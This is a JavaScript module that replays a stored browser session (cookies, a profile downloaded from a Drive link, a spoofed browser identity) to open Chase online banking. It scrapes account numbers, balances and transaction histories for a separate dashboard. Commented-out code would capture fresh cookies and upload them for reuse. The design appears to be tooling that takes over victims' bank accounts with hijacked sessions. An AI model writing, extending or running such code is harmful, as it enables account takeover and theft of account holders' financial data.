import logger from '../../../utils/logger.js';
import { launchBrowserWithSession, downloadAndExtractProfile } from '../../socials/_shared/routeHelper.js';
import { gotoRobust, sleep } from '../shared/browser.js';

export const BANK_SITES = {
    chase: {
        loginUrl: 'https://chase.com',
        accountCard: "div[data-testid='account-card'], .account-card, [class*='account']",
        transactionRow: "tr[data-testid='transaction-row'], .transaction-row, [class*='transaction']",
    },
};

export async function extractBank(session, explicitPlatform, browserId) {
    const cookieJSON = session.cookieJSON;
    const rawPlatform = explicitPlatform || session.bankPlatform || session.category || 'chase';
    const platformKey = String(rawPlatform).toLowerCase().trim();
    const bankConfig = BANK_SITES[platformKey] || BANK_SITES.chase;

    // Download profile from Drive if available
    let profileDir = null;
    if (session.driveUrl) {
        try {
            profileDir = await downloadAndExtractProfile(session.driveUrl, browserId);
        } catch (e) {
            logger.warn(`[smartExtract] bank profile download failed: ${e.message}`);
        }
    }

    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform: platformKey });
    // Set true only on the final successful return — drives the profile refresh in finally.
    let extractionSucceeded = false;
    try {
        const accounts = [];
        const transactions = [];

        try {
            await gotoRobust(page, bankConfig.loginUrl);
            accounts.push(...await page.evaluate((cardSel) => {
                const out = [];
                document.querySelectorAll(cardSel).forEach(card => {
                    const name = card.querySelector('h3, [class*="name"]')?.textContent?.trim() || '';
                    const balance = card.querySelector('[class*="balance"]')?.textContent?.trim() || 'N/A';
                    const number = card.querySelector('[class*="number"], [class*="accountNumber"]')?.textContent?.trim() || 'N/A';
                    if (name || balance !== 'N/A') out.push({ name, balance, number, type: 'CHECKING' });
                });
                return out;
            }, bankConfig.accountCard));

            const txnLinks = await page.$$("a[href*='transaction'], a[href*='activity']");
            if (txnLinks.length > 0) {
                await txnLinks[0].click().catch(() => {});
                await sleep(2500);
                transactions.push(...await page.evaluate((rowSel) => {
                    const out = [];
                    document.querySelectorAll(rowSel).forEach(row => {
                        const date = row.querySelector('[class*="date"]')?.textContent?.trim() || '';
                        const amount = row.querySelector('[class*="amount"]')?.textContent?.trim() || '';
                        const desc = row.querySelector('[class*="desc"], [class*="description"]')?.textContent?.trim() || '';
                        if (date || amount) out.push({ date, amount, description: desc });
                    });
                    return out;
                }, bankConfig.transactionRow));
            }
        } catch (e) {
            logger.warn(`[smartExtract] bank extraction failed: ${e.message}`);
        }

        // Normalize into the BankAccount[] shape the frontend BankExtractView expects.
        const toNum = (val) => {
            if (typeof val === 'number') return val;
            const m = String(val || '').replace(/[^0-9.\-]/g, '');
            const n = parseFloat(m);
            return isNaN(n) ? 0 : n;
        };
        const bankAccounts = accounts.length > 0
            ? accounts.map((acct, i) => ({
                accountId: String(acct.number || `${platformKey}-${i + 1}`),
                accountType: String(acct.type || 'CHECKING').toUpperCase(),
                accountNumber: acct.number || 'N/A',
                routingNumber: '',
                balance: toNum(acct.balance),
                currency: 'USD',
                lastTransactionDate: transactions[0]?.date || '',
                pendingTransactionsCount: 0,
                totalCredit: 0,
                totalDebit: 0,
                interestRate: undefined,
                transactions: transactions.map(t => ({
                    date: t.date,
                    type: /credit|\+/i.test(t.amount) ? 'CREDIT' : 'DEBIT',
                    amount: toNum(t.amount),
                    description: t.description,
                })),
                detailsExtractedFrom: bankConfig.loginUrl,
            }))
            : [{
                accountId: platformKey,
                accountType: 'CHECKING',
                accountNumber: 'N/A',
                routingNumber: '',
                balance: 0,
                currency: 'USD',
                lastTransactionDate: '',
                pendingTransactionsCount: 0,
                totalCredit: 0,
                totalDebit: 0,
                transactions: transactions.map(t => ({
                    date: t.date,
                    type: /credit|\+/i.test(t.amount) ? 'CREDIT' : 'DEBIT',
                    amount: toNum(t.amount),
                    description: t.description,
                })),
                detailsExtractedFrom: bankConfig.loginUrl,
            }];

        extractionSucceeded = true;
        return bankAccounts;
    } finally {
        // --- Post-extraction refresh: DISABLED (NO-TAMPER 2026-10-13) ---
        // Never write cookie/browser data back after extraction — use the
        // stored login-time session as-is (launcher principle). See wire
        // extractor finally block for the A/B evidence.
        logger.warn(`[smartExtract] Post-extraction refresh disabled (NO-TAMPER, bank) — keeping login-time cookieJSON/driveUrl/browserIdentity for ${browserId || 'unknown'}`);
        // let freshCookies = [];
        // if (extractionSucceeded && page && !page.isClosed()) {
        //     try {
        //         freshCookies = await page.cookies();
        //         logger.info(`[smartExtract] Captured ${freshCookies.length} fresh cookies for bank profile refresh`);
        //     } catch (e) {
        //         logger.warn(`[smartExtract] Fresh cookie capture failed: ${e.message}`);
        //     }
        // }
        await page.close().catch(() => {});
        await browser.close().catch(() => {});
        if (profileDir) {
            // if (extractionSucceeded && browserId && freshCookies.length > 0) {
            //     try {
            //         const updateData = {
            //             cookieJSON: JSON.stringify(freshCookies),
            //             formattedCookie: JSON.stringify(freshCookies, null, 2),
            //             lastUserActivity: new Date().toISOString(),
            //         };
            //         if (browser && browser.identity) {
            //             try { updateData.browserIdentity = JSON.stringify(browser.identity); } catch (_) {}
            //         }
            //         const uploadResult = await uploadBrowserDataRaw(browserId, updateData, profileDir, { force: true });
            //         if (uploadResult && uploadResult.ok && uploadResult.url) {
            //             updateData.driveUrl = uploadResult.url;
            //             logger.info(`[smartExtract] Refreshed bank profile uploaded for ${browserId}: ${uploadResult.url}`);
            //         } else {
            //             logger.warn(`[smartExtract] Bank profile refresh upload failed for ${browserId}: ${uploadResult?.reason || 'unknown'}`);
            //         }
            //         await setCachedRow(browserId, updateData);
            //         await immediateFlush(browserId);
            //     } catch (e) {
            //         logger.warn(`[smartExtract] Bank profile refresh failed (non-fatal): ${e.message}`);
            //     }
            // }
            const fs = await import('fs-extra');
            await fs.remove(profileDir).catch(() => {});
        }
    }
}
